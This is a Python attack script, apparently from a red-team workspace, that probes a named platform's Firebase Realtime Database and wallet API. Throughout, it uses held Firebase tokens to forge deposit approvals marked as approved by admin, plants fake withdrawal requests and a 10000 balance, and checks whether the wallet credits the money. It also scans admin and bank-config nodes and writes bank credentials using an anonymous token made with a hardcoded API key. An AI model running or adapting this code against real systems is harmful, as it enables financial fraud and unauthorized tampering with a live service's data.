#!/usr/bin/env python3
"""probe_rtdb_deposit.py — Firebase RTDB deposit approval write attempt.

   FINDING: vak88z RTDB /users/{fb_uid}/DEPOSIT_APPROVE/{deposit_id} is READABLE
   with our Firebase token. Contains approved deposit records.

   HYPOTHESIS: If the platform READS from RTDB to credit accounts (not just writes),
   we can forge a deposit approval by writing to RTDB.

   Even if read-only for credit: the full user node may expose other attack data.
"""
import json, pathlib, requests, time, uuid, base64

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
RTDB   = "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app"
JWT    = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()

# Use the freshest Firebase token available
_new = pathlib.Path("/home/kzp/claude-red/fb_id_token_new.txt")
FB_TOKEN = (_new.read_text().strip() if _new.exists() and _new.stat().st_size > 100
            else pathlib.Path("/home/kzp/claude-red/fb_id_token.txt").read_text().strip())

# Decode to get UID
parts = FB_TOKEN.split(".")
pad = parts[1] + "=" * (-len(parts[1]) % 4)
payload = json.loads(base64.urlsafe_b64decode(pad))
FB_UID = payload.get("sub") or payload.get("user_id", "")
print(f"Firebase UID: {FB_UID}")
print(f"Token expires in: {payload.get('exp',0) - int(time.time())}s")

PLATFORM_UID = "eea830ab-b187-4f21-9b79-28e2773b2f6b"  # platform sub from JWT
NEW_DEP_ID   = str(uuid.uuid4())
TS_MS        = int(time.time() * 1000)

def rtdb(path, method="GET", data=None):
    url = f"{RTDB}{path}?auth={FB_TOKEN}"
    if method == "GET":
        r = requests.get(url, timeout=12)
    elif method == "PUT":
        r = requests.put(url, json=data, timeout=12)
    elif method == "PATCH":
        r = requests.patch(url, json=data, timeout=12)
    elif method == "DELETE":
        r = requests.delete(url, timeout=12)
    return r

# ── 1. Read full user node to understand structure ───────────────────────────
print("\n=== READ /users/{fb_uid} (full) ===")
r = rtdb(f"/users/{FB_UID}.json")
print(f"  HTTP {r.status_code}")
if r.ok and r.text != "null":
    data = r.json()
    print(f"  Keys: {list(data.keys()) if isinstance(data, dict) else type(data)}")
    print(f"  Full data:\n{json.dumps(data, indent=2, ensure_ascii=False)[:2000]}")

    # Check existing deposit approvals
    deposits = data.get("DEPOSIT_APPROVE", {})
    print(f"\n  Existing DEPOSIT_APPROVE entries: {len(deposits)}")
    for dep_id, dep_data in deposits.items():
        print(f"    {dep_id}: amount={dep_data.get('amount','?')} status={dep_data.get('status','?')}")
else:
    print(f"  Data: {r.text[:300]}")

# ── 2. Check all possible subkeys under user node ────────────────────────────
print("\n=== Shallow scan of user node ===")
r = rtdb(f"/users/{FB_UID}.json?shallow=true")
print(f"  shallow: HTTP {r.status_code}: {r.text[:400]}")

# Also try platform UID (different from Firebase UID)
r2 = rtdb(f"/users/{PLATFORM_UID}.json?shallow=true")
print(f"  platform_uid shallow: HTTP {r2.status_code}: {r2.text[:200]}")

# ── 3. Try WRITE: forge a deposit approval ───────────────────────────────────
print("\n=== WRITE: forge deposit approval ===")
fake_approval = {
    "amount": "1000.00",
    "approve_status": "success",
    "approved_by": "admin",
    "status": "success",
    "timestamp": TS_MS,
    "uid": FB_UID,
}

# Try PUT (full write) to DEPOSIT_APPROVE node
for dep_id in [NEW_DEP_ID, "00000000-0000-0000-0000-000000000001"]:
    r = rtdb(f"/users/{FB_UID}/DEPOSIT_APPROVE/{dep_id}.json",
             method="PUT", data=fake_approval)
    print(f"  PUT DEPOSIT_APPROVE/{dep_id[:8]}: HTTP {r.status_code}: {r.text[:200]}")

# ── 4. Try PATCH the full DEPOSIT_APPROVE node ───────────────────────────────
print("\n=== PATCH DEPOSIT_APPROVE node ===")
patch_data = {NEW_DEP_ID: fake_approval}
r = rtdb(f"/users/{FB_UID}/DEPOSIT_APPROVE.json", method="PATCH", data=patch_data)
print(f"  PATCH: HTTP {r.status_code}: {r.text[:200]}")

# ── 5. Check if wallet balance changed after write ───────────────────────────
print("\n=== Wallet after RTDB write ===")
r = requests.get(f"{MGAPI}/mb/wallet",
                 headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                 timeout=10)
print(f"  Balance: {r.json().get('balance','?') if r.ok else r.text[:80]}")

# ── 6. Try to write to other potentially useful RTDB paths ──────────────────
print("\n=== WRITE to other paths ===")
# Try writing to the root (definitely denied, but confirms rule scope)
for path, data in [
    (f"/users/{FB_UID}/WITHDRAW_REQUEST/{NEW_DEP_ID}.json",
     {"amount": "1000.00", "status": "approved", "timestamp": TS_MS}),
    (f"/users/{FB_UID}/balance.json", {"balance": 10000.00}),
    (f"/users/{FB_UID}/status.json", "active"),
    (f"/deposits/{NEW_DEP_ID}.json", fake_approval),
    (f"/pending_approvals/{NEW_DEP_ID}.json", fake_approval),
]:
    r = rtdb(path, method="PUT", data=data)
    label = path.split("/")[2] + "/" + path.split("/")[3][:15]
    if r.status_code not in (401, 403):
        print(f"  [!!!] PUT {label}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  PUT {label}: HTTP {r.status_code}")

# ── 7. Scan broader RTDB for other nodes we can access ──────────────────────
print("\n=== Scan other RTDB top-level nodes ===")
for node in ["deposits", "pending_deposits", "withdrawals", "approvals",
             "bank_config", "webhooks", "devices", "admin",
             "transactions", "players", "balance"]:
    r = rtdb(f"/{node}.json?shallow=true")
    if r.status_code != 401:
        print(f"  [!!!] /{node}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  /{node}: 401")

# ── 8. We88zz RTDB — can we write device/webhook data? ──────────────────────
print("\n=== we88zz RTDB write attempts (anon token) ===")
# Refresh anonymous token for we88zz
r = requests.post(
    f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyAI5j8kaGDUcUDE5ZMk9Um4CneqEx-4q-s",
    json={"returnSecureToken": True}, timeout=12
)
if r.status_code == 200:
    anon = r.json()
    anon_token = anon.get("idToken", "")
    anon_uid   = anon.get("localId", "")
    print(f"  anon_uid: {anon_uid}")
    RTDB_WE = "https://we88zz-default-rtdb.asia-southeast1.firebasedatabase.app"

    # Try writing device credentials to we88zz RTDB
    for path, data in [
        (f"/devices/{anon_uid}.json", {"username": "testuser", "password": "testpass",
                                       "bank_code": "KBANK", "timestamp": TS_MS}),
        (f"/webhooks/{anon_uid}.json", {"url": "https://example.com", "token": "test"}),
        (f"/users/{anon_uid}/device.json", {"kbankUsername": "testuser", "kbankPassword": "testpass"}),
    ]:
        url = f"{RTDB_WE}{path}?auth={anon_token}"
        rw = requests.put(url, json=data, timeout=10)
        label = "/".join(path.split("/")[:3])
        if rw.status_code not in (401, 403):
            print(f"  [!!!] PUT {label}: HTTP {rw.status_code}: {rw.text[:200]}")
        else:
            print(f"  PUT {label}: HTTP {rw.status_code}")

print("\n=== DONE ===")
